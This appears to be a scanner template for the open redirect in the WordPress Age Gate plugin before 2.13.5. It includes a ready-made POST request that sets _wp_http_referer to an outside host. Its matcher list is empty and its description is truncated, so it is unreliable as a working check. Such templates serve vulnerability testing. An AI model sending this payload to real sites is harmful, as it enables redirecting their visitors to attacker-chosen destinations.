id: age-gate-open-redirect
brief:
    title: WordPress Age Gate <2.13.5 - Open Redirect
    by: akincibor
    level: medium
    about: WordPress Age Gate plugin before 2.13.5 contains an open redirect vulnerability via the  _wp_http_referer parameter after certain actions and after invalid or missing nonces. An attacker can redire...
    label:
        - agegate
        - unauth
        - wpscan
        - packetstorm
        - wp-plugin
        - redirect
        - wordpress
        - wp
        - vuln
    score: CVSS:6.1
moves:
    - verb: POST
      to:
        - '{{BaseURL}}/wp-admin/admin-post.php'
      head:
        Content-Type: application/x-www-form-urlencoded
      body: age_gate%5Bd%5D=10&age_gate%5Bm%5D=10&age_gate%5By%5D=1990&age_gate%5Bremember%5D=1&age_gate%5Bage%5D=TVRnPQ%3D%3D&action=age_gate_submit&age_gate%5Bnonce%5D=48f2b89fed&_wp_http_referer=https://interact.sh
      signs: []
